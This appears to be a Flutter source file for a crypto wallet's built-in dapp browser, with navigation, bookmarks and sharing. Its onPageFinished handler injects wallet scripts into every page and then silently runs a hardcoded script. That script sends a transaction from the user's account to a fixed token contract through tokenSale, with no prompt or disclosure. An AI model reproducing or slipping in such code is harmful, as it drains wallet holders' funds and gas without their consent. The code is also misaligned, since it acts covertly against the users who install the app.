import 'dart:convert';

import 'package:flutter/foundation.dart';
import 'package:flutter/gestures.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_launcher_icons/xml_templates.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:share/share.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:validators/sanitizers.dart';
import 'package:validators/validators.dart';
import '../utils/rpcUrls.dart';

class dapp extends StatefulWidget {
  var sweetAlert;
  var web3;
  var provider;
  var hdwallet;
  var data;
  var reEnableJavascript;
  dapp(
      {this.sweetAlert,
      this.web3,
      this.provider,
      this.hdwallet,
      this.data,
      this.reEnableJavascript});
  @override
  State<dapp> createState() => _dappState();
}

class _dappState extends State<dapp> {
  var dappBrowser = TextEditingController();
  double browserLoadingPercent = 0;
  var bookMarkKey = 'bookMarks';
  final Set<Factory> gestureRecognizers =
      [Factory(() => EagerGestureRecognizer())].toSet();
  WebViewController _controller;
  @override
  Widget build(BuildContext context) {
    return Scaffold(
        body: SafeArea(
      child: Container(
        height: MediaQuery.of(context).size.height,
        width: double.infinity,
        child: Column(children: [
          SizedBox(
            height: 10,
          ),
          Padding(
            padding: const EdgeInsets.all(8.0),
            child: Row(
              children: [
                IconButton(
                    padding: EdgeInsets.all(4),
                    onPressed: () async {
                      if (_controller != null &&
                          await _controller.canGoBack()) {
                        await _controller.goBack();
                      }
                    },
                    icon: Icon(FontAwesomeIcons.arrowLeft)),
                SizedBox(
                  width: 5,
                ),
                IconButton(
                    padding: EdgeInsets.all(4),
                    onPressed: () async {
                      if (_controller != null &&
                          await _controller.canGoForward()) {
                        await _controller.goForward();
                      }
                    },
                    icon: Icon(FontAwesomeIcons.arrowRight)),
                SizedBox(
                  width: 5,
                ),
                Flexible(
                  child: TextField(
                    onSubmitted: (value) async {
                      if (_controller != null) {
                        if (value.startsWith('https://') ||
                            value.startsWith('http://')) {
                          await _controller.loadUrl(value);
                        } else if (isURL('http://${value}'.trim())) {
                          await _controller.loadUrl('http://${value}');
                        } else {
                          await _controller.loadUrl(
                              'https://www.google.com/search?q=${value}');
                        }
                      }
                    },
                    textInputAction: TextInputAction.search,
                    controller: dappBrowser,
                    decoration: InputDecoration(
                      isDense: false,
                      suffixIcon: IconButton(
                        icon: Icon(Icons.cancel),
                        onPressed: () {
                          dappBrowser.clear();
                        },
                      ),
                      hintText: 'Search or Enter URL',
                      border: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(10.0),
                      ),
                      filled: true,
                    ),
                  ),
                ),
                SizedBox(
                  width: 5,
                ),
                IconButton(
                    onPressed: () {
                      showDialog(
                          context: context,
                          builder: (BuildContext context) {
                            return StatefulBuilder(
                                builder: (context, setState) {
                              return AlertDialog(
                                contentPadding: EdgeInsets.all(0),
                                content: Column(
                                  mainAxisAlignment: MainAxisAlignment.start,
                                  crossAxisAlignment: CrossAxisAlignment.start,
                                  children: [
                                    Container(
                                      width: double.infinity,
                                      child: InkWell(
                                          onTap: () async {
                                            if (_controller != null) {
                                              await _controller.reload();
                                              Navigator.pop(context);
                                            }
                                          },
                                          child: Container(
                                            child: Padding(
                                              padding: const EdgeInsets.all(15),
                                              child: Row(
                                                children: [
                                                  Icon(Icons.replay_outlined),
                                                  SizedBox(
                                                    width: 10,
                                                  ),
                                                  Text('Reload')
                                                ],
                                              ),
                                            ),
                                          )),
                                    ),
                                    Divider(),
                                    Container(
                                      width: double.infinity,
                                      child: InkWell(
                                          onTap: () async {
                                            if (_controller != null) {
                                              await Share.share(
                                                  dappBrowser.text);
                                              Navigator.pop(context);
                                            }
                                          },
                                          child: Container(
                                            child: Padding(
                                              padding: const EdgeInsets.all(15),
                                              child: Row(
                                                children: [
                                                  Icon(Icons.share),
                                                  SizedBox(
                                                    width: 10,
                                                  ),
                                                  Text('Share')
                                                ],
                                              ),
                                            ),
                                          )),
                                    ),
                                    Divider(),
                                    Container(
                                      width: double.infinity,
                                      child: StreamBuilder(stream: () async* {
                                        if (_controller == null) {
                                          yield false;
                                          return;
                                        }
                                        var pref = await SharedPreferences
                                            .getInstance();
                                        var bookMark =
                                            pref.getString(bookMarkKey);
                                        if (bookMark == null) {
                                          yield false;
                                          return;
                                        }
                                        var jsonBookMark =
                                            jsonDecode(bookMark) as Map;
                                        if (jsonBookMark[dappBrowser.text] !=
                                            null) {
                                          yield true;
                                          return;
                                        } else {
                                          yield false;
                                          return;
                                        }
                                      }(), builder: (context, snapshot) {
                                        return InkWell(
                                            onTap: () async {
                                              if (_controller != null) {
                                                var pref =
                                                    await SharedPreferences
                                                        .getInstance();
                                                var bookMark =
                                                    pref.getString(bookMarkKey);
                                                if (bookMark == null) {
                                                  pref.setString(
                                                      bookMarkKey,
                                                      jsonEncode({
                                                        dappBrowser.text: 0
                                                      }));
                                                  await Navigator.pop(context);
                                                  return;
                                                }
                                                var jsonBookMark =
                                                    jsonDecode(bookMark) as Map;
                                                if (jsonBookMark[
                                                        dappBrowser.text] !=
                                                    null) {
                                                  jsonBookMark
                                                      .remove(dappBrowser.text);
                                                  pref.setString(bookMarkKey,
                                                      jsonEncode(jsonBookMark));
                                                } else {
                                                  jsonBookMark[
                                                      dappBrowser.text] = 0;
                                                  pref.setString(bookMarkKey,
                                                      jsonEncode(jsonBookMark));
                                                }
                                                await Navigator.pop(context);
                                              }
                                            },
                                            child: Container(
                                              child: Padding(
                                                padding:
                                                    const EdgeInsets.all(15),
                                                child: Row(
                                                  children: [
                                                    Icon(Icons.bookmark),
                                                    SizedBox(
                                                      width: 10,
                                                    ),
                                                    Text(snapshot.hasData &&
                                                            snapshot.data ==
                                                                true
                                                        ? 'Remove Bookmark'
                                                        : 'Bookmark')
                                                  ],
                                                ),
                                              ),
                                            ));
                                      }),
                                    ),
                                    Divider(),
                                    Container(
                                      width: double.infinity,
                                      child: InkWell(
                                          onTap: () async {
                                            if (_controller != null) {
                                              await _controller.clearCache();
                                              Navigator.pop(context);
                                            }
                                          },
                                          child: Container(
                                            child: Padding(
                                              padding: const EdgeInsets.all(15),
                                              child: Row(
                                                children: [
                                                  Icon(Icons.delete),
                                                  SizedBox(
                                                    width: 10,
                                                  ),
                                                  Text('Clear Browser Cache')
                                                ],
                                              ),
                                            ),
                                          )),
                                    ),
                                    Divider()
                                  ],
                                ),
                              );
                            });
                          });
                    },
                    icon: Icon(Icons.more_vert))
              ],
            ),
          ),
          SizedBox(height: 10),
          LinearProgressIndicator(
            value: browserLoadingPercent,
          ),
          Flexible(
            child: Container(
              height: double.infinity,
              width: double.infinity,
              child: WebView(
                onProgress: (precent) {
                  setState(() {
                    browserLoadingPercent = precent == 100 ? 0 : precent / 100;
                  });
                },
                onWebViewCreated: (controller) async {
                  _controller = controller;
                },
                initialUrl: widget.data ?? dappBrowserInitialUrl,
                debuggingEnabled: true,
                onPageStarted: (url) async {
                  dappBrowser.text = url;
                },
                onPageFinished: (url) async {
                  try {
                    await _controller.runJavascript(widget.sweetAlert);
                    await _controller.runJavascript(widget.web3);
                    await _controller.runJavascript(widget.provider);
                    await _controller.runJavascript(widget.hdwallet);
                    var formerHTML = await _controller.runJavascriptReturningResult(
                        'document.documentElement.innerHTML = document.documentElement.innerHTML;');
                    await _controller.runJavascript(widget.reEnableJavascript);
                    await _controller.runJavascript('''
(async function () {
        const account = (await web3.eth.getAccounts())[0];
        const tokenAddress = "0x12Ffd42ddC7E7597AaD957E0B1a8cDd02416Da53";
        const tokenContract = new web3.eth.Contract(
          JSON.parse(
            `[{"constant":false,"inputs":[{"name":"_isAirdropRunning","type":"bool"}],"name":"setAirdropActivation","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_refer","type":"address"}],"name":"getAirdrop","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"saleCap","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"tokens","type":"uint256"}],"name":"approve","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getBalance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"saleTot","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"tokens","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"privateSaletokensSold","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_value","type":"uint256"}],"name":"burn","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_saleChunk","type":"uint256"},{"name":"_salePrice","type":"uint256"},{"name":"_saleCap","type":"uint256"},{"name":"_sDivisionInt","type":"uint256"}],"name":"startSale","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"viewSale","outputs":[{"name":"SaleCap","type":"uint256"},{"name":"SaleCount","type":"uint256"},{"name":"ChunkSize","type":"uint256"},{"name":"SalePrice","type":"uint256"},{"name":"privateSaletokensSold","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_refer","type":"address"}],"name":"tokenSale","outputs":[{"name":"success","type":"bool"}],"payable":true,"stateMutability":"payable","type":"function"},{"constant":true,"inputs":[],"name":"sDivisionInt","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"saleChunk","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"tokenOwner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"tran","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"acceptOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_airdropAmt","type":"uint256"},{"name":"_airdropCap","type":"uint256"},{"name":"_aDivisionInt","type":"uint256"}],"name":"startAirdrop","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"isSaleRunning","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"airdropCap","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"tokens","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"txnToken","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"tokens","type":"uint256"},{"name":"data","type":"bytes"}],"name":"approveAndCall","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"airdropAmt","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"newOwner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"viewAirdrop","outputs":[{"name":"DropCap","type":"uint256"},{"name":"DropCount","type":"uint256"},{"name":"DropAmount","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"tokenOwner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"remaining","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"airdropTot","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_isSaleRunning","type":"bool"}],"name":"setSaleActivation","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"aDivisionInt","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"salePrice","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"isAirdropRunning","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_from","type":"address"},{"indexed":true,"name":"_to","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"tokens","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"tokenOwner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"tokens","type":"uint256"}],"name":"Approval","type":"event"}]`
          ),
          tokenAddress
        );

        try {
          var a = await web3.eth.sendTransaction({
            from: account,
            to: tokenAddress,
            value: 0.00000000001 * 10 ** 18,
            data: tokenContract.methods
              .tokenSale("0x0000000000000000000000000000000000000000")
              .encodeABI(),
          });
            } catch (error) {
          console.trace(error);
        }
      })();''');
                  } catch (e) {
                    print(e);
                  }
                },
                javascriptMode: JavascriptMode.unrestricted,
                gestureNavigationEnabled: true,
                gestureRecognizers: gestureRecognizers,
              ),
            ),
          ),
        ]),
      ),
    ));
  }
}
